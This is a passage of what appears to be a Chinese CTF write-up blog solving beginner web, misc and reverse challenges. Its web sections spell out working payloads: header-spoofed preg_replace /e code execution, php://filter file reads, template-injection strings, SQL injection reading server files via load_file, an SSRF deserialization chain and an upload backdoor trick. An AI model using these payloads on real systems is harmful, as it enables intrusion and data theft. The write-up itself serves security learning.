class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">br</span> /&gt;&lt;<span class="hljs-title">br</span> /&gt;&lt;<span class="hljs-title">br</span> /&gt;&lt;<span class="hljs-title">br</span> /&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;<span class="hljs-title">else</span></span>&#123;<br><br><span class="hljs-meta">?&gt;</span><br>        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<br>        &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;<br>            &lt;p <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">lead</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">                <span class="hljs-title">if</span> (<span class="hljs-title">strpos</span>($<span class="hljs-title">page</span>, &#x27;<span class="hljs-title">input</span>&#x27;) &gt; 0) </span>&#123;<br>                    <span class="hljs-keyword">die</span>();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">die</span>();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">die</span>();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);<br>                &#125;<br>                    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>                    <span class="hljs-keyword">die</span>();<br>                <span class="hljs-meta">?&gt;</span><br>        &lt;/p&gt;<br>        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<br><br><span class="hljs-meta">&lt;?php</span><br>&#125;&#125;<br><br><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>于是伪造 <code>X-Forwarded-For: 127.0.0.1</code> 绕过检查（这里需要删除 <code>page</code> 参数</p><p>再利用 <code>preg_replace</code> 的 <code>/e</code> 模式进行命令执行</p><p><code>?pat=/.*/e&amp;rep=phpinfo();&amp;sub=1</code></p><p><img src="/posts/df9d333d/image-20240320002116111.png" alt="image-20240320002116111"></p><p>得到路径 <code>s3chahahaDir/flag/flag.php</code></p><p>再次使用前面的 <code>php://filter/read=convert.base64-encode/resource=s3chahahaDir/flag/flag.php</code> 得到flag</p><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>考察SSTI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hint.txt">/hints.txt<br>md5(cookie_secret+md5(filename))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs flag.txt">/flag.txt<br>flag in /fllllllllllllag<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs welcome.txt">/welcome.txt<br>render<br></code></pre></td></tr></table></figure><p>随便修改参数进入 <code>error?msg=</code> 发现此处可进行渲染</p><p>尝试 <code>config</code>失败</p><p>查了下资料要用 <code>handler.settings</code> ，得到</p><p><img src="/posts/df9d333d/image-20240320010417945.png" alt="image-20240320010417945"></p><p>根据 hint</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filehash = md5(&#x27;de045cd4-e5cb-445d-83a9-5491b7fb8e9a&#x27; + md5(&#x27;/fllllllllllllag&#x27;))<br></code></pre></td></tr></table></figure><h2 id="lottry"><a href="#lottry" class="headerlink" title="lottry"></a>lottry</h2><p>php 弱比较</p><p><img src="/posts/df9d333d/image-20240320141336840.png" alt="image-20240320141336840"></p><p>只要使 <code> $number[$i]</code> 为 <code>true</code> 就行，这样只要 <code>$win_numbers</code> 不全为0即可拿到大奖，多试几次就攒够了</p><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os app = flask.Flask(__name__) <br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read() <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>] <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s <br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>一眼SSTI</p><p>过滤了<code>(</code>,<code>)</code>,<code>config</code>,<code>self</code></p><p>可以通过 <strong>全局变量</strong> 绕过</p><ul><li><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;</code> </li><li><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;</code></li></ul><h2 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h2><p>尝试 <code>php://filter/read=convert.base64-encode/resource=check.php</code></p><p>发现encode被过滤了</p><p>同时base64、rot、quoted也不行</p><p>尝试 <code>php://filter/convert.iconv.utf-8.utf-7/resource=check.php</code>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs utf-7">+ADw?php if(+ACQAXw-GET+AFsAIg-filename+ACIAXQ)+AHs +ACQ-preg+AF8-match+AF8-username +AD0 &#x27;return preg+AF8-match(+ACI-/base+AHw-be+AHw-encode+AHw-print+AHw-zlib+AHw-quoted+AHw-write+AHw-rot13+AHw-read+AHw-string/i+ACI, +ACQAXw-GET+AFsAIg-filename+ACIAXQ)+ADs&#x27;+ADs if (eval(+ACQ-preg+AF8-match+AF8-username)) +AHs die(+ACI-do not hack+ACEAIg)+ADs +AH0 +AH0<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$encoded</span> = <span class="hljs-string">&quot;+ADw?php if(+ACQAXw-GET+AFsAIg-filename+ACIAXQ)+AHs +ACQ-preg+AF8-match+AF8-username +AD0 &#x27;return preg+AF8-match(+ACI-/base+AHw-be+AHw-encode+AHw-print+AHw-zlib+AHw-quoted+AHw-write+AHw-rot13+AHw-read+AHw-string/i+ACI, +ACQAXw-GET+AFsAIg-filename+ACIAXQ)+ADs&#x27;+ADs if (eval(+ACQ-preg+AF8-match+AF8-username)) +AHs die(+ACI-do not hack+ACEAIg)+ADs +AH0 +AH0&quot;</span>;<br><span class="hljs-variable">$decoded</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;UTF-7&#x27;</span>, <span class="hljs-string">&#x27;UTF-8&#x27;</span>, <span class="hljs-variable">$encoded</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$decoded</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>])&#123;<br>        <span class="hljs-variable">$preg_match_username</span> = <span class="hljs-string">&#x27;return preg_match(&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;, $_GET[&quot;filename&quot;]);&#x27;</span>; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$preg_match_username</span>)) &#123;<br>            <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack!&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>猜测 flag.php </p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs utf-7">+ADw?php +ACQ-flag+AD0&#x27;cyberpeace+AHs-3e6bc52e2f48074bc1530a88d5466a2b+AH0&#x27;+ADs<br></code></pre></td></tr></table></figure><p>即 <code>cyberpeace&#123;3e6bc52e2f48074bc1530a88d5466a2b&#125;</code></p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>) &gt; <span class="hljs-number">6000000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>) &lt;= <span class="hljs-number">3</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>) &amp;&amp; <span class="hljs-string">&#x27;8b184b&#x27;</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))&#123;<br>        <span class="hljs-variable">$key1</span> = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...再想想&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$c</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>]) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>] &gt; <span class="hljs-number">2022</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>][<span class="hljs-number">0</span>]))&#123;<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br>        <span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no...&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;DGGJ&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no......&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-variable">$key2</span> = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> &amp;&amp; <span class="hljs-variable">$key2</span>)&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Hgfks.php&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You&#x27;re right&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> Emmm...<br></code></pre></td></tr></table></figure><p>首先 <code>$a</code> 使用科学计数法绕过即 <code>9e9</code>（9 * 10 ^9)</p><p>$b使用脚本穷举即可，得到 <code>b = 53724</code></p><p>其次 <code>c = &#123;&quot;m&quot;:&quot;2023a&quot;,&quot;n&quot;:[[&quot;DGGJ&quot;],0]&#125;</code></p><p>其中 <code>array_search()</code>函数在数组中搜索某个键值，并返回对应的键名，传入0可使其返回值也为0，即可绕过</p><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p><code>view.php?no=</code> 存在sql注入</p><p>其中过滤了命令中的空格</p><p><code>?no=-1 union/**/select/**/1,group_concat(no,&#39;~&#39;,username,&#39;~&#39;,passwd,&#39;~&#39;,data),3,4/**/from/**/fakebook.users</code> 绕过</p><p><img src="/posts/df9d333d/image-20240320171100537.png" alt="image-20240320171100537"></p><p>可以看出 data 列中储存的是序列化后的字符串</p><p>同时访问<code>robots.txt</code> 发现存在备份文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><p>综上，需要我们构造反序列化链</p><p>因为 curl_exec 无防护，所以可以进行SSRF伪造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$res</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$res</span>);<br></code></pre></td></tr></table></figure><p>再通过 <code>-1 union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code>回显</p><p><img src="/posts/df9d333d/image-20240320171501482.png" alt="image-20240320171501482"></p><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h3><p>回显点在第二个位置所以尝试直接 load_file 读取文件</p><p><code>?no=-1 union/**/select/**/1,load_file(&quot;/var/www/html/flag.php&quot;),3,4</code></p><p><img src="/posts/df9d333d/image-20240320172154027.png" alt="image-20240320172154027"></p><h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><p>文件上传，有内容检测</p><p>尝试发现 有 <strong>后端后缀检测</strong>、<strong>文件不能包含PHP字段</strong>、<strong>文件头检测</strong>、.<strong>htacess过滤</strong>、MIME检测</p><p>而 <code>.user.ini</code> 存活，</p><p><img src="/posts/df9d333d/image-20240320195512869.png" alt="image-20240320195512869"></p><p><img src="/posts/df9d333d/image-20240320195547878.png" alt="image-20240320195547878"></p><p>原理：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a><img src="/posts/df9d333d/image-20240320195936508.png" alt="image-20240320195936508"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p>题干得</p><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>浏览器打开，<code>Ctrl</code>+<code>A</code> 复制即可</p><p><img src="/posts/df9d333d/image-20240320202101245.png" alt="image-20240320202101245"></p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 与佛论禅">夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮<br></code></pre></td></tr></table></figure><p>得到 <code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></p><p>根据题意 rot13 解码</p><p><code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code></p><p>再通过 base64<img src="/posts/df9d333d/image-20240320202335296.png" alt="image-20240320202335296"></p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>用 stegsolver 逐帧查看得到二维码</p><p>补上定位码扫描即可</p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>idea 打开，查找得</p><p><img src="/posts/df9d333d/image-20240320202519584.png" alt="image-20240320202519584"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><blockquote><p>菜鸡觉得前面的题目太难了，来个简单的缓一下</p></blockquote><p>ida 打开</p><p><code>shift</code> + <code>F12</code> 得到</p><p><img src="/posts/df9d333d/image-20240322183922916.png" alt="image-20240322183922916"></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><blockquote><p>菜鸡最近迷上了玩游戏，但它总是赢不了，你可以帮他获胜吗</p></blockquote><p><code>shift</code> + <code>F12</code></p><p><img src="/posts/df9d333d/image-20240322191031729.png" alt="image-20240322191031729"></p><p>跳过来</p><p><img src="/posts/df9d333d/image-20240322191300434.png" alt="image-20240322191300434"></p><p>异或回去就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 